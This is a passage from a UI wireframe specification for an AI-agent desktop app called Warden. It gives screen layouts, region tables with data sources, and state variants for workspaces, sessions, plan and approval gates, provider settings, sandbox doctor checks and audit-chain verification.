# B03 Wireframes

This deliverable gives low-fidelity layout specifications for all seven screens (SCR-1 to SCR-7) and six states (ST-1 to ST-6) of the Warden PoC desktop app, then high-fidelity specifications for SCR-2 Session view, SCR-3 Plan review (G1), SCR-4 Approval prompt and SCR-5 Result review (G2). Structure and navigation come from B01, flows from B02. Component names are those of core §11 (internals in B04); token names are those of core §11 (values in B06); keyboard keys are the fixed set of core §11 (behavior in B05). Every element that shows a decision, a routing choice or a cost names its data source: an API method of core §6 or an event type and payload field of core §5. Microcopy keys used here are listed in §15; B07 owns the final wording. Labels written in quotes without a key are short final labels; longer texts point to a key ("see B07 `approval.scope.help.workspace`").

## 0. Conventions

### 0.1 Units, tokens and assumed values

Sizes are CSS pixels at 1x. Where a size is a token, the token name is authoritative and the pixel value in parentheses is the value this layout assumes (ASM; if B06 changes a value, structural widths in this file stay and inner spacing follows the token).

| Token | Assumed value | Token | Assumed value |
|---|---|---|---|
| `space-1` | 4 | `text-xs` | 11 / 16 line |
| `space-2` | 8 | `text-sm` | 12 / 18 |
| `space-3` | 12 | `text-md` | 14 / 20 |
| `space-4` | 16 | `text-lg` | 16 / 24 |
| `space-5` | 20 | `text-xl` | 20 / 28 |
| `space-6` | 24 | `mono-sm` | 12 / 18 |
| `space-7` | 32 | `mono-md` | 13 / 20 |
| `space-8` | 40 | `radius-sm` / `md` / `lg` | 4 / 6 / 8 |

Fixed structural sizes (not tokens): TopBar 48, NavRail 56, Banner 40, SessionHeader 56, RunHeader 36, ToolCallRow 28, button heights 32 (default) and 28 (compact), segmented control 32, focus ring 2 (`color-focus`).

### 0.2 Breakpoints

| Name | Window width | Reference width |
|---|---|---|
| `w1024` | 1024 to 1179 | 1024 |
| `w1280` | 1180 to 1359 | 1280 |
| `w1440` | 1360 to 1679 | 1440 |
| `w1920` | 1680 and above | 1920 |

Minimum window 1024 × 640 (Tauri `minWidth`, `minHeight`); below that the window cannot shrink. The 1180 boundary is where the context panel turns into a drawer.

### 0.3 Notation

Region maps are ASCII boxes, not to scale. Each map is followed by a region table: Region, Content, Data source. "Source" names the method or event; `→` means "field of". Empty, loading and error variants are listed per screen.

## 1. App shell (all screens)

```
+-------------------------------------------------------------------------------------------+
| [Warden]  Workspaces › ts-express-api › Session 01JAXR8Q                        (•) Live [⋯] |  TopBar 48
+------+------------------------------------------------------------------------------------+
| [WS] | Banner: connection / ST-2 / ST-6   (0..3 rows, 40 each)                             |
| [ST] +------------------------------------------------------------------------------------+
| [DR] |                                                                                    |
|      |  Route outlet                                                                      |
| 56px |                                                                                    |
+------+------------------------------------------------------------------------------------+
```

| Region | Content | Data source |
|---|---|---|
| TopBar left | Wordmark "Warden" (`text-md`, 600, `color-text`); breadcrumb (`text-sm`, `color-text-muted`, last segment `color-text`), segments are links | route params; workspace name from `workspace.list`; session short id (first 8 chars of the ULID) |
| TopBar right | Connection indicator: 8 px dot plus a text label ("Live", "Reconnecting", "Disconnected"; `color-state-succeeded`, `color-state-waiting`, `color-state-failed`; tooltip "Runtime connected · wardend 0.1.0"); "Shared mode" chip when `mode: shared`; overflow menu: Theme (System, Light, Dark), About | `system.hello` → `daemon_version`, `mode`; transport state |
| NavRail | Three 40 × 40 icon buttons, 8 px apart, top-aligned at 12 px: Workspaces, Settings, Doctor and audit; active item has a 2 px `color-accent` left bar and `color-surface-2` background; tooltip labels; Doctor shows a 6 px `color-state-failed` dot when any check fails | route; `system.doctor` → `checks[].status` |
| Banner stack | `Banner` rows, full content width, 40 px, icon + one sentence + at most two actions; variants: connection (`color-state-waiting` accent), ST-2 (`color-state-failed`, blocking), ST-6 (`color-state-failed`, session scoped) | §9 |

The TopBar and the `SessionHeader` (§10.2) are the two rows of the `AppShell` header of B04 C-01; this file fixes their layout and element positions, B04 their props. The `PendingApprovalBadge` sits in the `SessionHeader` on SCR-2 to SCR-5 and as a per-workspace marker on SCR-1 (B05 §6.7). Theme: `color-bg` behind the outlet, `color-surface-1` for TopBar and NavRail, 1 px `color-border` separators. Light and dark themes switch all tokens; no layout change.

## 2. SCR-1 Workspace home (low fidelity)

```
+------+------------------------------------------------------------------------------------+
| Nav  | Workspaces                                             [Open directory…]           |  page header 64
|      +------------------------------------------------------------------------------------+
|      | NAME / PATH            CLASSIFICATION  SANDBOX   PROVIDERS           LAST OPENED    |  table header 32
|      | ts-express-api         [internal ▾]    L1 Seat.  4 · 3 admissible    2 min ago  [>] |  row 64
|      | ~/code/ts-express-api  Agents can: read/write this repo, run build and test …      |
|      |   └ Sessions (3): ses 01JAXR8Q · succeeded · $0.00 · 10:21   [Open]                 |  expanded
|      | go-cli-tool            [confidential ▾] L1 Seat. 4 · 2 admissible    yesterday  [>] |
|      | injection-lab          [confidential ▾] L1 Seat. 4 · 2 admissible    3 days     [>] |
|      +------------------------------------------------------------------------------------+
|      | CLI: warden open <dir> [--classification internal]                                 |  footer hint
+------+------------------------------------------------------------------------------------+
```

Content column: max width 1200, centered, side padding `space-6`.

| Region | Content | Data source |
|---|---|---|
| Page header | Title "Workspaces" (`text-xl`); primary button "Open directory…" (disabled under ST-2 with reason `state.sandbox_missing.action_disabled`) | `system.doctor` |
| Workspace table | One `WorkspaceRow` per workspace, sorted by last opened: name (`text-md` 600) and root path (`mono-sm`, middle-truncated); classification select (`StatusBadge classification` as trigger; change follows B02 F3); sandbox level and backend; providers "4 · 3 admissible" (configured count and admissible count for this classification); last opened (relative time, absolute in tooltip); expand chevron | `workspace.list` → `root`, `classification`, `last_opened_at`, `sessions_count`, `capabilities_summary.text`, `sandbox_level` (ID-13); `provider.list`; `provider.models {classification}` (ID-13) → `admissible`; backend from `system.doctor` |
| Capability line | Second line of the row: one sentence, `text-sm`, `color-text-muted`, one line with ellipsis, full text in tooltip | `workspace.list` → `capabilities_summary.text` (ID-13) |
| Expanded sessions | `session.list` rows: short id, status, created, last activity, cost, Open button | `session.list {workspace_id}` → `status`, `last_activity_at`, `cost_usd` |
| Footer hint | CLI equivalent, `mono-sm` | static |

Row actions: click or `Enter` opens the latest session (`session.open {workspace}` resumes, `resumed: true`) or creates one; "New session" in the expanded area always creates one.

Variants:

| Variant | Presentation |
|---|---|
| Empty | Centered block 480 wide: title `empty.workspaces.title`, one sentence `empty.workspaces.body`, "Open directory…" button, CLI line. |
| Loading | 3 skeleton rows of 64 px (`color-surface-2` bars); header and button render immediately. |
| Error | `workspace.list` error: inline error panel with the error string (`error.<code>`) and Retry; the Open button stays usable. |
| ST-1 | Wizard replaces the table (§9.1) with "Skip for now" link. |
| ST-2 | Banner + DoctorChecklist replaces the table (§9.2); known workspaces listed below it read-only. |

## 3. SCR-2 Session view (low fidelity; high fidelity in §10)

```
+------+------------------------------------------------------------------------------------+
| Nav  | SessionHeader: name, branch | classification | sandbox | chain | capabilities | $ | Cancel |
|      +----------------------------------+-------------------------------------------------+
|      | Timeline                         | ContextPanel                                    |
|      |  Run 1 header (sticky)           |  header: selected entry title + state           |
|      |  request entry                   |  tabs (task) or sections (tool call, approval)  |
|      |  system line                     |                                                 |
|      |  TaskCard plan (routing, calls)  |                                                 |
|      |  Gate G1 entry                   |                                                 |
|      |  TaskCard implement              |                                                 |
|      |    ApprovalCard (inline)         |                                                 |
|      |----------------------------------|                                                 |
|      | Dock: RequestComposer | RunStatusStrip                                            |
+------+----------------------------------+-------------------------------------------------+
```

Regions and sources are specified in §10. Variants: empty session (no runs): timeline shows `empty.timeline` with three example requests as plain text (not buttons) and the composer focused; loading (event replay): skeleton entries while `event.subscribe {after_seq: 0}` replays, then entries appear in `seq` order without animation; error: `not_found` renders `error.not_found` with a link to SCR-1.

## 4. SCR-3 Plan review, G1 (low fidelity; high fidelity in §11)

```
+------+------------------------------------------------------------------------------------+
| Nav  | SessionHeader                                        [1 pending · G1 open] [Cancel] |
|      +----------------------------------+-------------------------------------------------+
|      | Timeline                         | ContextPanel (gate entry selected)              |
|      |  TaskCard plan  (succeeded)      |  Plan provenance: routing view of the plan task |
|      |  Gate G1 · Plan review [Waiting] |  artifact metadata (version, hash, producer)    |
|      |  +----------------------------+  |  v1 / v2 comparison after an edit               |
|      |  | PlanCard (inline, full)    |  |  CLI                                            |
|      |  |  model line, summary,      |  |                                                 |
|      |  |  steps + files, expected   |  |                                                 |
|      |  |  files, risks, estimate    |  |                                                 |
|      |  +----------------------------+  |                                                 |
|      |----------------------------------|                                                 |
|      | GateBar (sticky): [Approve plan A] [Edit plan ⌘E] [Reject R] [Cancel run ⌘.]        |
|      | RunStatusStrip: Waiting for you: Plan review (G1)                                  |
+------+----------------------------------+-------------------------------------------------+
```

Variants: loading plan artifact (skeleton sections inside the card), plan read error (`error.rpc.<code>` with Retry and the CLI `warden artifact <id>`), editing (§11.3), resolved (card collapsed, "Plan approved by you · 10:03:40", or "with edits").

## 5. SCR-4 Approval prompt (low fidelity; high fidelity in §12)

```
Timeline column                                 ContextPanel (when selected)
+--------------------------------------------+  +---------------------------------------------+
| TaskCard implement   [Waiting for approval]|  | Approval apr_9                   [Waiting]  |
|  routing line, step counter                |  | same card content, full width               |
|  +--------------------------------------+  |  | Policy decision (dec_…, rules, obligations) |
|  | Title                    R4 · 10:07:31 |  |  | Explain (policy.explain layers)             |
|  | What / Who / Why                      |  |  | Grant preview for chosen scope             |
|  | Scope [1 Once][2 Task][3 Sess][4 Wsp] |  |  | CLI                                         |
|  | Explain E          [Reject R][Approve A]| | [Reject R]            [Approve A]           |
|  +--------------------------------------+  |  +---------------------------------------------+
+--------------------------------------------+
OS notification: "Approval needed · ts-express-api" / "coder (implement) wants to run npm install …"
SessionHeader: [1 pending · G1 open] (PendingApprovalBadge)
```

Variants: pending, submitting, approved, rejected, expired, cancelled, resolved elsewhere, error (§12.4).

## 6. SCR-5 Result review, G2 (low fidelity; high fidelity in §13)

```
+------+-----------------+-----------------------------------------------------------------+
| Nav  | SessionHeader                                                                      |
|      +-----------------+-----------------------------------------------------------------+
|      | Timeline        | Result review · Gate G2                          [Waiting]      |
|      | (compact)       | [Tests 43 passed] [Cost $0.00] [Audit chain Verified]           |
|      |  one line per   | Tabs: Changes (4) | Tests (43) | Cost                            |
|      |  entry          | +-----------+-----------------------------------------------+   |
|      |                 | | file list | DiffViewer (unified / split, provenance)      |   |
|      |                 | +-----------+-----------------------------------------------+   |
|      |                 | GateBar/DeliveryBar: status | Accept A | Discard R | Iterate | Export | Apply | Commit | Push |
+------+-----------------+-----------------------------------------------------------------+
```

Variants: verification failed (read-only, CF-24), after commit, push pending, push rejected, loading diff, diff too large (§13.9).

## 7. SCR-6 Settings: providers and models (low fidelity)

```
+------+------------------------------------------------------------------------------------+
| Nav  | Providers and models                 [Detect local servers] [Add provider…]        |
|      | Tabs: Providers | Models                                                           |
|      +------------------------------------------------------------------------------------+
|      | ProviderCard: anthropic      anthropic-messages   [T3]  api_key (keychain)          |
|      |               ● ok · tested 2 min ago · 412 ms              [Test] [Remove]          |
|      | ProviderCard: ollama         openai-compatible    [T0]  none                        |
|      |               ● ok · 2 models                               [Test] [On/Off] [Remove] |
|      | ProviderCard: company-vllm   openai-compatible    [T1]  gateway bearer (keychain)   |
|      |               ● ok · 1 model · https://llm.your-vps.example/v1  [Test] [Remove]      |
|      | ProviderCard: copilot        copilot-sdk harness  [T4]  subscription · permitted     |
|      |               Vendor terms: see B07 harness.terms.permitted    [Test] [On/Off]       |
|      | ProviderCard: codex          codex-app-server     [T4]  chatgpt_login · tolerated    |
|      |               disabled · needs acknowledgment                 [Enable…]             |
|      | ProviderCard: claude-code    claude-code-cli      [T4]  personal_use_only            |
|      |               locked in shared mode (if mode is shared)                             |
+------+------------------------------------------------------------------------------------+
Models tab:
| MODEL                    PROVIDER      TIER  TOOLS     JSON  CONTEXT  PRICE in/out  PRIORS p/i/v/s  CONFIDENTIAL |
| anthropic/claude-sonnet  anthropic     T3    native    yes   200k     3.00/15.00    .9/.9/.9/.9     no           |
| local/qwen-coder-32b     ollama        T0    native    yes   32k      0.00 local    .6/.55/.7/.8    yes          |
| company/qwen-coder-32b   company-vllm  T1    native    yes   32k      0.00 hosted   .6/.55/.7/.8    yes          |
| local/qwen-coder-7b      ollama        T0    emulated  no    32k      0.00 local    .3/.25/.5/.7    yes          |
| copilot                  copilot       T4    harness   n/a   n/a      quota         n/a             no           |
```

| Region | Content | Data source |
|---|---|---|
| Header actions | "Detect local servers" runs the path B detection of B02 F1.2 inline; "Add provider…" opens `SetupWizard` (`/setup`) | `provider.test`, `provider.add` |
| `ProviderCard` | Name and id (`mono-sm`), protocol or harness kind, `StatusBadge tier`, auth mode or billing (never a secret; "keychain" means a `secret://` reference exists), status dot and text (`ok`, `failed` with error code, `untested`, `disabled`, `locked`), last test time and latency, base URL for remote providers, vendor-terms note for harnesses (`harness.terms.*`), actions Test, Enable toggle, Remove | `provider.list` → `providers[]`, `harnesses[]` (`status`, `tier`, `auth_mode`, `billing`, `vendor_terms`, `last_test`); `provider.test`; `provider.enable`; `provider.remove {confirm: true}` |
| Remove confirmation | Dialog: "Remove anthropic? The API key is deleted from the keychain." [Cancel] [Remove] | `provider.remove` |
| Models table | Sortable table, sticky header 32, rows 36; "Confidential" column shows admissibility for `confidential` (yes/no with `tier_not_admitted` in tooltip) | `provider.models` → `tier`, `capabilities`, `pricing`, `quality_prior`; admissibility from `provider.models {classification: confidential}` (ID-13) |

Variants: empty (→ ST-1 wizard in place), loading (skeleton cards), test running (spinner in the card's status, other actions disabled), test failed (status `failed` with `error.<model error code>` text and "Details" disclosure with the probe result), harness locked (`harness.locked.shared_mode`, toggle disabled).

## 8. SCR-7 Doctor and audit (low fidelity)

```
+------+------------------------------------------------------------------------------------+
| Nav  | Doctor and audit                         Tabs: Doctor | Audit                      |
|      +------------------------------------------------------------------------------------+
| Doctor tab                                                                   [Re-run checks] |
|      | Sandbox                                                                            |
|      |  ✓ Sandbox backend: Seatbelt available                                              |
|      |  ✗ bubblewrap not found                      blocking   Fix: sudo apt install bubblewrap [Copy] |
|      | Keychain      ✓ Keychain reachable (service warden)                                  |
|      | Providers     ✓ anthropic ok · ✓ ollama ok · ! codex disabled                        |
|      | Disk          ✓ 38 GB free in ~/.warden                                             |
+------------------------------------------------------------------------------------------+
| Audit tab                                                                                   |
|      | Session [ses 01JAXR8Q · ts-express-api ▾]     [Verify chain]  [Export…]             |
|      | Chain: [Verified] 1,284 events · strict ok · checkpoint ok · verified 10:22:03       |
|      | Filters: [All] [Policy] [Tool] [Model] [Approval]   type contains [        ]         |
|      | SEQ    TIME      TYPE              TASK        SUMMARY                               |
|      | 4412   10:07:31  policy.decision   implement   allow · user.package-install (apr_9)  |
|      | 4413   10:07:31  tool.exec.start   implement   proc.exec npm install                 |
|      | ...                                                           [row → JSON drawer]    |
+------------------------------------------------------------------------------------------+
```

| Region | Content | Data source |
|---|---|---|
| `DoctorChecklist` | Groups Sandbox, Keychain, Providers, Disk; row: status icon, `title`, `detail`, "blocking" tag, `fix_hint` as copyable `mono-sm` command; failing blocking rows first | `system.doctor` → `checks[{id, group, status, title, detail, fix_hint, blocking}]` |
| Session selector | Combobox of sessions across workspaces (workspace name, short id, status, date) | `workspace.list`, `session.list` |
| Chain status | `StatusBadge chain` + counts + time of last verification; violations list when failed | `audit.verify {session_id, strict: true}` → `ok`, `chain_ok`, `strict_ok`, `checkpoint_ok`, `events`, `violations[]` |
| Export | Dialog: "Include artifact contents" checkbox; result: path, events, artifacts, sha256, re-verify command | `audit.export {session_id, with_blobs}` |
| `EventLog` | Virtualized table (row 28), columns seq, time, type, task key, one-line summary; filter chips map to type prefixes (`policy.`, `tool.`, `model.`, `approval.`); selecting a row opens a JSON drawer (480 wide) with the envelope (payload already redacted by the daemon) | `event.query {session_id, after_seq, limit: 1000, types}` paged |

Variants: doctor running (spinner per group), all green (`empty.doctor_ok` line), audit with no session (`empty.audit`), verify running (badge `verifying`, button disabled), ST-6 (§9.6), export error (inline with CLI command).

## 9. States (low fidelity)

### 9.1 ST-1 No provider configured

```
+------+------------------------------------------------------------------------------------+
| Nav  | Set up model access                                         step 1 of 2           |
|      | see B07 state.no_provider.body (one sentence)                                      |
|      | +-------------------+ +-------------------+ +-------------------+ +-------------------+ |
|      | | API key           | | Local model       | | Company-hosted    | | Subscription      | |
|      | | Anthropic, OpenAI | | Ollama, LM Studio | | endpoint          | | harness           | |
|      | | [T3]              | | [T0]              | | [T1] or [T2]      | | [T4]              | |
|      | | Not for           | | OK for            | | OK for            | | Not for           | |
|      | | confidential      | | confidential      | | confidential      | | confidential      | |
|      | | [Set up]          | | [Detect]          | | [Set up]          | | [Set up]          | |
|      | +-------------------+ +-------------------+ +-------------------+ +-------------------+ |
|      | CLI: warden provider add anthropic --api-key | warden provider add ollama | …        |
+------+------------------------------------------------------------------------------------+
```

Cards: 4 columns at `w1280` and wider (each ≥ 240), 2 × 2 at `w1024`. Each card: title `text-lg`, examples `text-sm`, `StatusBadge tier`, confidential admissibility line (static per tier, BI-7), one button. Step 2 is the chosen path's form (B02 F1.2), 560 wide, with the live test result block below the form (`provider.add` → `test`). Source for "is ST-1": `provider.list`. Error states per path are in B02 F1.2.

### 9.2 ST-2 Sandbox prerequisites missing

```
+------+------------------------------------------------------------------------------------+
| Nav  | [!] Sandbox prerequisites missing. Agents cannot run until fixed.  [Re-run] [Doctor] |  Banner (global)
|      +------------------------------------------------------------------------------------+
|      | The sandbox is required. There is no unsandboxed mode.  (state.sandbox_missing.body) |
|      | ✗ bubblewrap not found                                                  blocking    |
|      |   Fix:  sudo apt install bubblewrap                                      [Copy]      |
|      | ✗ Unprivileged user namespaces disabled                                 blocking    |
|      |   Fix:  sudo sysctl -w kernel.unprivileged_userns_clone=1                [Copy]      |
|      | [Re-run checks]                                                                     |
|      | Known workspaces (read-only history) …                                              |
+------+------------------------------------------------------------------------------------+
```

Global banner on every route (not dismissable while the condition holds); main-region checklist on SCR-1 and as wizard step 0. Disabled controls elsewhere carry `state.sandbox_missing.action_disabled` as tooltip and `aria-describedby`. Source: `system.doctor`; also any `sandbox_unavailable` (-32006) response re-runs `system.doctor`.

### 9.3 ST-3 No admissible model

```
| ◌ implement  coder@1.0.0 · implement                               [Needs input]  |
|   Paused: anthropic/claude-sonnet (T3) is not admissible for confidential data.  |
|   (state.no_admissible.paused_body)                                              |
|   Candidates: anthropic/claude-sonnet T3 tier_not_admitted · copilot T4 …  [Details] |
|   [Continue on company/qwen-coder-32b]  [Configure provider]  [Change classification…]  [Cancel run] |
```

A `TaskCard` in `waiting_for_input` with a 1 px `color-state-waiting` border. Title line from `task.state` (`reason: no_admissible_model`); the explanation names the eliminating constraint from `routing.decision` → `candidates[].reason_code` and `classification` (`state.no_admissible.body` when nothing is configured for the tier: "Confidential data can use T0, T1 or T2 models only. None is configured."). The Continue button names the best admissible model from `provider.models {session_id}` (first `admissible: true` by the router's order; hidden if none) and calls `session.setPin {session_id, pin_model}` (ID-04), which re-routes the waiting task at once. The runtime also re-routes by itself after a successful `provider.configured`, a classification change or a circuit closing (ID-04), so the card can clear without a click.

Fallback pause variant (ID-16, CF-44): when the task's model fails and only higher-tier admissible models remain, the runtime never widens the tier on its own; the task enters `waiting_for_input` with reason `provider` and the same card reads "Paused: local/qwen-coder-32b (T0) is unavailable (provider_unavailable). Fallback never moves to a higher tier on its own." with the primary action "Continue on anthropic/claude-sonnet (T3)" (`st.3.action.continue_on`), which calls `session.setPin {session_id, pin_model: "anthropic/claude-sonnet"}`; the action is offered only for models admissible for the workspace classification (never T3/T4 on `confidential`). The same state before a run starts (`session.request` error `no_admissible_model`) shows this block inline above the composer instead of in a task card.

### 9.4 ST-4 Budget exhausted

```
| ✗ implement  coder@1.0.0 · implement                       [Failed · budget]      |
|   Session budget reached: $5.00 of $5.00. Work so far is saved (checkpoint).     |
|   Spent this session $5.00 · Today $7.40 of $15.00                                |
|   Raise session limit to [$ 10.00] (max $10.00)   [Raise and resume]  [Cancel run] |
```

`BudgetCard` in the timeline. Spend from the sum of `model.call.end.usage.estimated_cost.amount`; limit and daily figures from `workflow.get` → `budget{session_usd, session_spent_usd, daily_usd, daily_spent_usd}` (ID-13); max from `session.setBudget` → `max_allowed_usd` (the input is pre-validated against it after a first call returns the bound; entering more shows `state.budget.over_max`). "Raise and resume" calls `session.setBudget {session_id, session_usd}` then `workflow.resume {run_id, from: last_gate}` when the run has an approved G1; if the budget ran out during `plan`, the button reads "Raise and run again" and sends `session.request` with the same text after `budget.changed`. Local and company-hosted runs never reach this state because their cost is 0.00.

### 9.5 ST-5 Cancelled

```
| Run 1 · Add a GET /users/:id …                                    [Cancelled] 04:10 |   greyed
|   … entries in color-state-cancelled …                                             |
| ⊘ Cancelled by you at implement step 14 · partial diff kept · 3 processes stopped  |
|   [View partial diff]                                                              |
|----------------------------------------------------------------------------------- |
| ResumeBar:  Resume from G1 (plan approved 10:03:40)   [Resume from G1]  [Run again] |
```

ST-5 is also the state of a run ended by a gate rejection (G1 "Reject" or G2 "Discard result": run `cancelled`, reason `rejected`, ID-01); the `CancelledEntry` then reads "Plan rejected by you" or "Result discarded by you" and the verified evidence stays readable. The whole run group renders with `color-state-cancelled` text and icons; nothing is hidden. `CancelledEntry` sources: `task.state` (step from the last `model.call.start.step`), `artifact.created` (`partial: true`), `sandbox.destroy` → `killed_pids` length. `ResumeBar` replaces the dock (48 px) until the user submits a new request; "Resume from G1" (`workflow.resume`) only when the run has an approved `gate-plan`, else "Run again" only (`resume.unavailable` explains why).

### 9.6 ST-6 Chain verification failed

```
| [!] Audit chain verification failed for this session. Evidence may have been altered. |
|     [View violations]  [Export anyway…]                                  (Banner, red) |
Audit tab:
| Chain: [Failed]  chain_ok no · strict_ok yes · checkpoint_ok no · verified 10:40:12  |
| Violations                                                                          |
|  seq 4417  hash_mismatch          prev_hash does not match event 4416   [Open]      |
|  seq 5701  checkpoint_signature   signature invalid for key k1           [Open]      |
```

Banner on SCR-2 to SCR-5 of that session and on the Audit tab (`state.chain_failed.title`, `.body`). Violations from `audit.verify` → `violations[{seq, kind, detail}]`; Open calls `event.query` around `seq`. "Export anyway…" shows `audit.export.warning_failed_chain` before `audit.export`. The session remains readable; delivery actions at G2 stay available (the chain state is evidence, not a lock), but the Commit and Push confirmations add the line `deliver.chain_failed_note`.

## 10. SCR-2 Session view (high fidelity)

### 10.1 Grid

The session view is a two-column layout below the `SessionHeader`: a fixed-width timeline column and a fluid context panel, separated by a 1 px splitter. The timeline width is fixed per breakpoint so entry wrapping stays stable while events stream; the panel absorbs the remaining width because diffs, tables and JSON need it.

| Breakpoint | NavRail | Timeline column | Splitter | ContextPanel | Panel content padding |
|---|---|---|---|---|---|
| `w1920` (1920) | 56 | 640 | 1 | fluid: 1223 at 1920, 983 at 1680 | `space-6` (24); text blocks max 880 |
| `w1440` (1440) | 56 | 560 | 1 | fluid: 823 at 1440, 743 at 1360 | `space-6` (24); text max 760 |
| `w1280` (1280) | 56 | 480 | 1 | fluid: 743 at 1280, 643 at 1180 | `space-5` (20) |
| `w1024` (1024) | 56 | fluid 968 to 1123; entries max 760, left-aligned with `space-6` left padding | none | drawer 480 wide, overlays the right edge of the timeline, `elevation-3`, no scrim | `space-4` (16) |

Splitter (`w1280` and wider): 1 px `color-border` line with an 8 px invisible hit area; drag range timeline 440 to 50 % of the content width, panel minimum 400; double-click resets to the breakpoint default; the chosen width is a per-viewer convenience in `localStorage` (wrapped in try/catch; defaults apply when storage fails).

Drawer (`w1024`): opens on `Enter` on a timeline entry and on selection by click; it never opens by itself (arriving approvals and gates render inline in the timeline, which is full width at this breakpoint, and focus does not move, B05 §7.1); closes on `Esc` or its close button; the timeline stays scrollable and interactive under the uncovered part; focus moves into the drawer on open and back to the originating entry on close (B05).

Vertical structure of the timeline column: `RunHeader` (sticky, 36) above a scrolling entry list; while G1 is open the sticky `GateBar` (64, §11.2) sits directly above the dock (at G2 it lives in the review panel, §13.7); the dock at the bottom (not scrolling): `RequestComposer` (idle, 124), `RunStatusStrip` (run active, 40) or `ResumeBar` (ST-5, 48). The timeline scroller sets `scroll-padding-bottom` to the height of the sticky elements so a focused entry is never hidden (B05 §3.3). The context panel has its own header (56, sticky), a scrolling body and, for gates and approvals, a sticky footer (64).

### 10.2 SessionHeader (56)

```
| ts-express-api                 [internal▾] [L1 · Seatbelt] [Chain: unverified▾] [Agents can: read/write this repo … ▾]   [1 pending · G1 open]   $0.00 / $5.00   [Cancel run  ⌘.] |
| warden/01jaxr8q… · base 7c1e9b2                                                                                           session                            |
```

| Element | Spec | Source |
|---|---|---|
| Name | `text-lg`, 600, `color-text`; click opens SCR-1 with this workspace expanded | `workspace.list` → root basename |
| Branch line | `mono-sm`, `color-text-muted`: session branch truncated to 16 chars + "…", " · base " + 7-char base commit | `session.open` → `branch`; `worktree.create` → `base_commit` |
| Classification | `StatusBadge classification`, height 24, `radius-sm`, `color-class-internal`; chevron opens a menu: public, internal, confidential (B02 F3) | `session.open` → `classification`; `workspace.classification` → `to` |
| Sandbox | `StatusBadge sandbox`: "L1 · Seatbelt" (macOS), "L1 · bubblewrap" (Linux), "L2 · Docker"; tooltip lists mounts summary "worktree rw · toolchain ro · scratch · proxy" | `session.open` → `sandbox_level`; backend from `sandbox.create` → `backend`, before any task from `system.doctor` |
| Chain | `StatusBadge chain`: `unverified` (neutral), `verifying` (spinner), `verified` (`color-state-succeeded`), `failed` (`color-state-failed`); menu: Verify chain, Export audit…, Open audit | `audit.verify` |
| Capabilities | `CapabilitySummaryChip`, max width 360 (`w1440`+), 280 (`w1280`), icon-only 32 × 32 at `w1024`; popover lists "Can" and "Needs approval" items | `session.open` → `capabilities_summary{text, can[], needs_approval[]}` |
| Pending | `PendingApprovalBadge` (§12.6), left of the cost; slot reserved while the session has an active run | global and session subscriptions |
| Cost | `CostPanel` compact: "$0.00 / $5.00" `mono-md`, label "session" `text-xs`; when a harness ran, a second value "3 premium requests"; click opens the Cost tab of the latest run | Σ `model.call.end.usage.estimated_cost.amount`; limit `workflow.get` → `budget.session_usd` (ID-13), `budget.changed` → `to_usd`; quota Σ `usage.quota.units`, `harness.session.end.quota` |
| Cancel | Secondary danger button 32 high, label "Cancel run", key hint "⌘." (macOS) or "Ctrl+." (Linux); present only while a run is `running` or `waiting`; its 132 px slot is reserved while a session has an active run so the header never shifts | `workflow.start` / `workflow.end`; action `session.cancel` |

At `w1024` the branch line is hidden (tooltip on the name) and the capability chip is icon-only. Order and presence of the badges never change with state.

### 10.3 Timeline

#### 10.3.1 RunHeader (36, sticky)

`text-sm`: "Run 1" (600) · request excerpt (`color-text-muted`, one line, ellipsis) · right-aligned run status badge (`running`, `waiting`, `succeeded`, `failed`, `cancelled` with `color-state-*`) and elapsed `mono-sm`. For resumed runs: "Run 2 · resumed from G1 of Run 1". Source: `workflow.start` (`resumed_from`), `workflow.end` (`status`), `session.request` (`text`). Runs are separated by 16 px of `color-bg` and the next sticky header.

#### 10.3.2 Entry anatomy

```
 <-40-><----------------------- content ------------------------><-16->
 |  ●  | Title (text-md 600)                  10:02:11 · $0.00 |    |
 |  |  | body line(s)                                          |    |
 |  |  | body line(s)                                          |    |
 |  ●  | next entry                                            |    |
```

| Part | Spec |
|---|---|
| Gutter | 40 wide; status icon 16 × 16 centered at x = 20, top 14; connector 1 px `color-border` from icon bottom + 4 to next icon top − 4 |
| Padding | top and bottom `space-3` (12); right `space-4` (16) |
| Title row | min height 20; title `text-md` 600 `color-text`; meta right-aligned: time or elapsed `mono-sm` `color-text-muted`, cost badge `mono-sm` |
| Body | starts `space-1` (4) under the title; lines `text-sm` unless stated |
| Selected | background `color-surface-2`; 2 px `color-accent` bar at the left edge of the entry |
| Hover | background `color-surface-1` |
| Focus | 2 px `color-focus` outline inset 2; `J`/`K` move focus between entries (including `RoutingLine` and `ToolCallRow` children that are visible), `Enter` selects into the panel |

Status icons (16): queued hollow circle `color-text-muted`; running spinner `color-state-running` (reduced motion: static three-quarter ring); waiting filled dot with pulse ring `color-state-waiting` (reduced motion: static dot with ring); succeeded check `color-state-succeeded`; failed cross `color-state-failed`; cancelled slashed circle `color-state-cancelled`; deny shield-cross `color-effect-deny`; approval shield-question `color-effect-approval`; system line small dot 6 `color-text-muted`.

#### 10.3.3 Entry variants with canonical content

| Entry | Title row | Body | Source |
|---|---|---|---|
| Request | "Request" · 10:02:11 | Request text `text-md` `color-text`, 3-line clamp with "Show all" (full text in panel); chips 20 high: `[internal]` (`StatusBadge classification` small), `[change]`, pin chip `[pinned: anthropic/claude-sonnet]` if set | `session.request` → `text`, `kind`, `pin_model`; envelope `classification` |
| System line | none (single line, 28 high, `text-sm` `color-text-muted`) | "Session branch warden/01jaxr8q… created from 7c1e9b2" | `worktree.create` |
| Task card | §10.3.4 | §10.3.4 | `task.state` etc. |
| Gate G1 (open) | "Gate G1 · Plan review" + `[Waiting for you]` | the full `PlanCard` inline (§11.2); sticky `GateBar` below the timeline | `workflow.gate.presented`; plan via `artifact.read` |
| Gate G1 (resolved) | "Gate G1 · Plan approved" · 10:03:40 | "by you · plan v1" or "by you · plan v2 (edited)" or "rejected by you" | `workflow.gate.resolved` → `decision`, `approver`, `edited_artifact` |
| Gate G2 (open) | "Gate G2 · Result review" + `[Waiting for you]` | "4 files +86 −3 · 43 passed · $0.00 · chain verified"; button "Review result" | `workflow.gate.presented`; `code-diff` → `stats`; `test-report` → `passed`; `audit.verify` |
| Delivery line | none (28 high) | "Result accepted · run succeeded"; "Committed 3f9c2a1, branch warden/01jaxr8q… published"; "Push rejected (apr_14). Nothing was pushed." in `color-effect-deny` | `workflow.end`; `workflow.delivered` (ID-02); `approval.resolved` |
| Failed result | "Result · verification failed" `color-state-failed` | "42 passed · 1 failed after 1 repair round"; button "View result" | `task.state` (`verify-2` → `failed`, `verification`), `workflow.end` |
